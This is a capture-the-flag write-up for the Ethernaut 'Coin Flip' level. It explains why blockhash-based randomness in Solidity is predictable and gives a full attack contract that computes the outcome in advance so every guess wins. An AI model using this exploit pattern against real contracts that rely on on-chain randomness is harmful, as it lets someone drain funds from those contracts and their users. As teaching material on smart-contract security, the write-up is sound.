# hEthernaut 03: Coin Flip - Insecure Randomness

Learn about random numbers in Solidity

## The Task Intro

Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have contr``ol over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org)), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).

## The Task Code

The Coinflip task is a smart contract that has a flip function. It retrieves the blockhash of the block before, casts it to uint256 and devides it by a static huge factor, so the number might be 1.

## The Solution

There is no randomness because another contract can make the same calculation and therefore predict the outcome and always win.

```apache
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract coinFlipAttack {
    CoinFlip cf;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (CoinFlip _cfa){
       cf = _cfa;
    }

    function attack()external{
        uint256 blockValue = uint256(blockhash(block.number -1));
        uint256 coinFlip = blockValue/FACTOR;

        bool result = coinFlip ==1 ? true: false;
        cf.flip(result);
    }
}
```
